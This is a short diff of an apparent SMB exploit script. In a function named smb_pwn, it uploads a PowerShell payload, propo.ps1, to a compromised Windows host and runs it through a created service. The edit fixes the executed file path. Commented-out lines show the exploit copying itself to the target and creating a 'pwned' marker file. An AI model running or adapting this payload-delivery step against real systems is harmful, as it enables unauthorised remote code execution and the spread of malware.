@@ -923,7 +923,7 @@ def smb_pwn(conn, arch):
 	# Since we have the function, easier to send it from exploiter
 	smb_send_file(smbConn, pathlib.Path().cwd().joinpath('propo.ps1'), 'C', '/Propo.ps1')
 	# Execute file
-	service_exec(smbConn, r'cmd /c C:\Propo')
+	service_exec(smbConn, r'cmd /c C:\Propo.ps1')
 
 	#smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
 	#service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
